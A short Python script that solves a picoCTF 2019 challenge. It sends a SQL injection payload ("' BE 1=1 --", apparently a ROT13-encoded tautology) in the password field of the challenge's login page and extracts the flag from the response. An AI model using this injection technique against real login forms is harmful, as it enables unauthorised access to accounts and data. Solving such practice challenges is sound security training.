import requests

URL = "https://2019shell1.picoctf.com/problem/47247/login.php"

PAYLOAD = {
    'password': "' BE 1=1 --",
    'debug': '0'
}

response = requests.post(url=URL, data=PAYLOAD)

data = response.text

flagIndex = data.index('picoCTF{')+8

flag = data[flagIndex:flagIndex+22]

print(flag)
